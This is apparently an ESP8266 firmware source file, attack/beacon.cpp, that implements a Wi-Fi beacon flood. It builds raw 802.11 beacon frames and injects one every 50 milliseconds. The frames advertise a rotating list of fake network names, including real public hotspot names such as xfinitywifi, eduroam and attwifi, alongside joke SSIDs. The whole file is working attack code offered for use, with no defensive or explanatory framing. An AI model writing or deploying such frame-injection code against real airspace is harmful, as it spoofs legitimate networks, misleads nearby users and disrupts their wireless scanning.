// File: attack/beacon.cpp
#include "beacon.h"
#include <Ticker.h>
#include <ESP8266WiFi.h>
#include <user_interface.h>

int beaconchannel = 1;
static Ticker beaconTicker;
static bool isactive = false;
static uint32_t beaconctr = 0;
static int currentssididx = 0;

static const char *fakessid[] = {
    "xfinitywifi", "linksys", "eduroam", "FreeWifi_secure", "attwifi",
    "Marriott_Guest", "BTWiFi-with-FON", "Google Starbucks",
    "SM Free Wifi by Globe", "Pretty Fly For a Wi‑Fi", "Wu‑Tang LAN",
    "LAN Solo", "Drop It Like It's Hotspot", "FBI Surveillance Van",
    "Tell my wifi love her"};
static const int numfakessid = sizeof(fakessid) / sizeof(fakessid[0]);
static uint8_t beaconBuf[128];
static size_t beaconLen = 0;
static uint8_t baseBSSID[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};

// Build beacon frame
static void buildBeaconFrame(const char *ssid, int channel)
{
    uint8_t *p = beaconBuf;
    // Frame control, duration, dest
    memset(p, 0, 10);
    memset(p + 4, 0xFF, 6);
    p += 10;
    // Address fields
    memcpy(p, baseBSSID, 6);
    p += 6;
    memcpy(p, baseBSSID, 6);
    p += 6;
    *p++ = 0;
    *p++ = 0; // sequence
    // Timestamp & interval & capability
    memset(p, 0, 8);
    p += 8;
    *p++ = 0x64;
    *p++ = 0;
    *p++ = 0x01;
    *p++ = 0x04;
    // SSID IE
    *p++ = 0x00;
    *p++ = strlen(ssid);
    memcpy(p, ssid, strlen(ssid));
    p += strlen(ssid);
    // Rates IE
    uint8_t rates[] = {0x01, 8, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
    memcpy(p, rates, sizeof(rates));
    p += sizeof(rates);
    // DS IE
    *p++ = 0x03;
    *p++ = 0x01;
    *p++ = channel;

      // TIM IE (required for visibility in some scanners)
    *p++ = 0x05; // Element ID
    *p++ = 0x04; // Length
    *p++ = 0x00; // DTIM Count
    *p++ = 0x01; // DTIM Period
    *p++ = 0x00; // Bitmap Control
    *p++ = 0x00; // Partial Virtual Bitmap



    beaconLen = p - beaconBuf;
}

// ISR-safe sector
static void IRAM_ATTR sendbeacontick()
{
    wifi_set_channel(beaconchannel);
    beaconchannel = (beaconchannel == 1) ? 1:(beaconchannel+5);
    baseBSSID[5] = currentssididx;
    buildBeaconFrame(fakessid[currentssididx], 6);
    wifi_send_pkt_freedom(beaconBuf, beaconLen, 0);
    beaconctr++;
    currentssididx = (currentssididx + 1) % numfakessid;
}

void startbeaconflood()
{
    if (isactive)
        return;
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_enable(0);
    delay(10);
    wifi_set_channel(6);
    delay(10);
    wifi_promiscuous_enable(1);

    beaconctr = 0;
    isactive = true;
    beaconTicker.attach_ms(50, sendbeacontick);
    Serial.println("[ESP8266] Beacon flood started.");
}

void stopbeaconflood()
{
    if (!isactive)
        return;
    beaconTicker.detach();
    isactive = false;
    Serial.printf("[ESP8266] Beacon flooding stopped after %u packets.\n", beaconctr);
}

void sendsinglebeacon(){
    buildBeaconFrame("testssid" ,6);
    wifi_send_pkt_freedom(beaconBuf , beaconLen ,0);
    Serial.print("sinbgle beacon");



}